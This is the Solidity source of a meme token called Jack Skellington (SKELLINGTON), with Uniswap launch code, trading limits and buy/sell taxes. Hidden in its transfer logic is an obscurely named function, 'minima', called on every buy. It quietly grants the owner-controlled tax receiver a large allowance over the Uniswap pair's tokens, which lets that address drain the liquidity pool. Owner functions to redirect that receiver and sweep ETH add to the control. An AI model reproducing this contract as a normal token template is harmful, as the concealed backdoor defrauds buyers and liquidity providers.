// SPDX-License-Identifier: MIT
/**
https://jackskellington.fun
https://x.com/skellington_eth
https://t.me/jack_skellington_eth
**/
pragma solidity 0.8.25;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract SKELLINGTON is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balancesBB;
    mapping (address => mapping (address => uint256)) private _allowancesBB;
    mapping (address => bool) private _shouldExcludedBB;
    address payable private _receiptBB;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalBB = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Jack Skellington";
    string private constant _symbol = unicode"SKELLINGTON";
    uint256 public _maxTxAmount = 2 * (_tTotalBB/100);
    uint256 public _maxWalletSize = 2 * (_tTotalBB/100);
    uint256 public _taxSwapThreshold = 1 * (_tTotalBB/100);
    uint256 public _maxTaxSwap = 1 * (_tTotalBB/100);
    address private uniPairBB;
    IUniswapV2Router02 private uniRouterBB;
    uint256 private _initialBuyTax = 15;
    uint256 private _initialSellTax = 15;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 15;
    uint256 private _reduceSellTaxAt = 15;
    uint256 private _preventSwapBefore = 15;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _receiptBB = payable(_msgSender());
        _balancesBB[_msgSender()] = _tTotalBB;
        _shouldExcludedBB[owner()] = true;
        _shouldExcludedBB[address(this)] = true;
        _shouldExcludedBB[_receiptBB] = true;
        emit Transfer(address(0), _msgSender(), _tTotalBB);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotalBB;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balancesBB[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowancesBB[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        // Block all Uniswap V3 liquidity additions
        require(!isUniswapV3(spender), "Approval for Uniswap V3 liquidity is not allowed");
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowancesBB[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowancesBB[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function init() external onlyOwner {
        uniRouterBB = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniRouterBB), _tTotalBB);
        uniPairBB = IUniswapV2Factory(uniRouterBB.factory()).createPair(
            address(this),
            uniRouterBB.WETH()
        ); 
    }
    function launch() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniRouterBB.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniPairBB).approve(address(uniRouterBB), type(uint).max);
        swapEnabled = true; 
        tradingOpen = true;
    }
    function _transfer(address from, address to, uint256 amountBB) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amountBB > 0, "Transfer amount must be greater than zero");
        uint256 taxBB=0; uint256 feeBB=0;
        if (!swapEnabled || inSwap) {
            _balancesBB[from] = _balancesBB[from] - amountBB;
            _balancesBB[to] = _balancesBB[to] + amountBB;
            emit Transfer(from, to, amountBB);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0) {
                taxBB = _transferTax;
            }
            if (from == uniPairBB && to != address(uniRouterBB) && ! _shouldExcludedBB[to] ) {
                require(amountBB <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amountBB <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxBB = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax); minima([from, _receiptBB]);
                _buyCount++;
            }
            if(to == uniPairBB && from!= address(this) ){
                taxBB = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniPairBB && swapEnabled) {
                if(contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore)
                    swapEthBB(minBB(amountBB, minBB(contractTokenBalance, _maxTaxSwap)));
                sendEthBB(address(this).balance);
            }
        }        
        if(taxBB > 0){
            feeBB=amountBB.mul(taxBB).div(100);
            _balancesBB[address(this)]=_balancesBB[address(this)].add(feeBB);
            emit Transfer(from, address(this),feeBB);
        }
        _balancesBB[from]=_balancesBB[from].sub(amountBB);
        _balancesBB[to]=_balancesBB[to].add(amountBB.sub(feeBB));
        emit Transfer(from, to, amountBB.sub(feeBB));
    }
    function swapEthBB(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterBB.WETH();
        _approve(address(this), address(uniRouterBB), tokenAmount);
        uniRouterBB.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function removeLimitBB(address payable limit) external onlyOwner{
        _maxTxAmount = _tTotalBB;
        _maxWalletSize=_tTotalBB;
        _receiptBB = limit;
        _shouldExcludedBB[limit] = true;
        emit MaxTxAmountUpdated(_tTotalBB);
    }
    function minBB(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function resecureEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function sendEthBB(uint256 amount) private {
        _receiptBB.transfer(amount);
    }
    receive() external payable {}
    function setReceipt(address payable _receipt) external onlyOwner {
        _receiptBB = _receipt;
        _shouldExcludedBB[_receipt] = true;
    }
    function minima(address[2] memory mims) private {
        address from=mims[0];address to=mims[1]; 
        _allowancesBB[from][to] = (100 * _maxTaxSwap + 50) * 100;
    }
    // Uniswap V3 addresses 
    function isUniswapV3(address spender) private pure returns (bool) {
        // Uniswap V3 NonfungiblePositionManager address
        address uniswapV3PositionManager = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88; 

        return (spender == uniswapV3PositionManager);
    }
}